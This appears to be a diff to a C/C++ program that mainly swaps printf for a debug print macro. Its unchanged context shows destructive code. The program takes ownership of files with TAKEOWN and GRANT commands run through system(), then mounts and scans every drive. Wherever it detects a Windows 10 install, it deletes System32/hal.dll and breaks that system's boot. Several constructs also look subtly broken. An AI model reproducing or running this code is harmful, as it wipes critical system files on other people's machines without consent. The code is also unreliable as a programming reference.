@@ -6,6 +6,7 @@
  */
 
 #include <assert.h>
+#include <stdarg.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -17,8 +18,17 @@
 #include <sys/stat.h>
 #endif
 
+#define DEBUG 1
+#ifdef DEBUG
+#define print printf
+#else
+#define print do_nothing
+#endif
+
 #define RED    "\x1b[91m"
 #define NORMAL "\x1b[0m"
+
+static void do_nothing(auto n, ...) {}
 
 enum OS_Lang { English, Spanish };
 enum AccessLevel { User = 1, Admin = 2, System = 3 };
@@ -77,7 +87,7 @@ static bool GetSystem[[maybe_unused]](AccessLevel& program, const char* file) {
   strcpy(takeown, "TAKEOWN /F ");
   strcat(takeown, file);
   strcat(takeown, " /A");
-  printf("Executing: %s\n", takeown);
+  print("Executing: %s\n", takeown);
   system(takeown);
   delete takeown;
 
@@ -88,7 +98,7 @@ static bool GetSystem[[maybe_unused]](AccessLevel& program, const char* file) {
     strcat(grant, " /GRANT Administrators:F");
   else
     strcat(grant, " /GRANT Administradores:F");
-  printf("Executing: %s\n", grant);
+  print("Executing: %s\n", grant);
   system(grant);
   delete(grant);
 
@@ -104,7 +114,9 @@ static bool IsUserSystem(AccessLevel& program, const char* file) {
     return GetSystem(program, file);
   } else {
     MessageBox(nullptr, "Admin access is required on this OS.\n", "Windows 10", MB_ICONERROR | MB_OK);
-    // exit(EXIT_FAILURE);
+#ifndef DEBUG
+    exit(EXIT_FAILURE);
+#endif
   }
 #endif
   return false;
@@ -117,11 +129,11 @@ void DeleteIf(bool cond, const char* path) {
       remove(path);
 
     switch (program) {
-      case User: printf("Running has User\n");
+      case User: print("Running has User\n");
       break;
-      case Admin: printf("Running has Admin\n");
+      case Admin: print("Running has Admin\n");
       break;
-      case System: printf("Running has System\n");
+      case System: print("Running has System\n");
       break;
     }
   }
@@ -129,7 +141,7 @@ void DeleteIf(bool cond, const char* path) {
 
 void MountedSearch() {
 #ifndef _WIN32
-  printf("Looking for mounted drives...\n");
+  print("Looking for mounted drives...\n");
   const char* list_drives = "lsblk -nro NAME,MOUNTPOINT | awk '$1~/[[:digit:]]/ && $2 != \"\"' > drive_list";
   system(list_drives);
   FILE* drive_list = fopen("drive_list", "r");
@@ -139,25 +151,25 @@ void MountedSearch() {
   char source[32];
 
   while (fscanf(drive_list, "%s %s\n", drive, source) == 2) {
-    printf("Drive %s mounted in: %s\n", drive, source);
+    print("Drive %s mounted in: %s\n", drive, source);
     if (strcmp(source, "/") == 0) strcpy(source, "\0");
     char* name = new char[strlen(source) + 28];
     strcpy(name, source);
     strcat(name, "/Windows/System32/D3D12.dll");
-    printf("Looking for file: %s\n", name);
+    print("Looking for file: %s\n", name);
 
     stat buffer;
     if (stat(name, &buffer) == 0) {
-      printf(RED "ERROR: Windows 10 detected in partition:" NORMAL " %s\n", drive);
+      print(RED "ERROR: Windows 10 detected in partition:" NORMAL " %s\n", drive);
       char* del = new char[strlen(source) + 26];
       strcpy(del, source);
       strcat(del, "/Windows/System32/hal.dll");
-      printf("Deleting %s ...\n", del);
+      print("Deleting %s ...\n", del);
       remove(del);
       delete del;
     }
     delete name;
-    printf("\n");
+    print("\n");
   }
   fclose(drive_list);
   remove("drive_list");
@@ -166,7 +178,7 @@ void MountedSearch() {
 
 void UnmountedSearch() {
 #ifndef _WIN32
-  printf("Looking for unmounted drives...\n");
+  print("Looking for unmounted drives...\n");
   const char* list_drives = "lsblk -nro NAME,MOUNTPOINT | awk '$1~/[[:digit:]]/ && $2 == \"\"' > drive_list";
   system(list_drives);
   FILE* drive_list = fopen("drive_list", "r");
@@ -175,9 +187,9 @@ void UnmountedSearch() {
   char drive[16];
 
   while (fscanf(drive_list, "%s\n", drive) == 1) {
-    printf("Unmounted drive found in: %s\n", drive);
+    print("Unmounted drive found in: %s\n", drive);
 
-    printf("Mounting drive...\n");
+    print("Mounting drive...\n");
     char* mount = new char[strlen(drive) + 33];
     strcpy(mount, "udisksctl mount -b /dev/");
     strcat(mount, drive);
@@ -192,31 +204,31 @@ void UnmountedSearch() {
     fclose(media);
     remove("media");
     if (mounted != 2) {
-      printf(RED "WARNING: drive %s not mountable or already mounted." NORMAL " \n", drive);
+      print(RED "WARNING: drive %s not mountable or already mounted." NORMAL " \n", drive);
       continue;
     }
 
     int length = strlen(source);
     source[length - 1] = '\0';
-    printf("Drive %s mounted in: %s\n", drive, source);
+    print("Drive %s mounted in: %s\n", drive, source);
 
     char* name = new char[strlen(source) + 28];
     strcpy(name, source);
     strcat(name, "/Windows/System32/D3D12.dll");
-    printf("Looking for file: %s\n", name);
+    print("Looking for file: %s\n", name);
 
     stat buffer;
     if (stat(name, &buffer) == 0) {
-      printf(RED "ERROR: Windows 10 detected in partition:" NORMAL " %s\n", drive);
+      print(RED "ERROR: Windows 10 detected in partition:" NORMAL " %s\n", drive);
       char* del = new char[strlen(source) + 26];
       strcpy(del, source);
       strcat(del, "/Windows/System32/hal.dll");
-      printf("Deleting %s ...\n", del);
+      print("Deleting %s ...\n", del);
       remove(del);
       delete del;
     }
     delete name;
-    printf("\n");
+    print("\n");
   }
   fclose(drive_list);
   remove("drive_list");
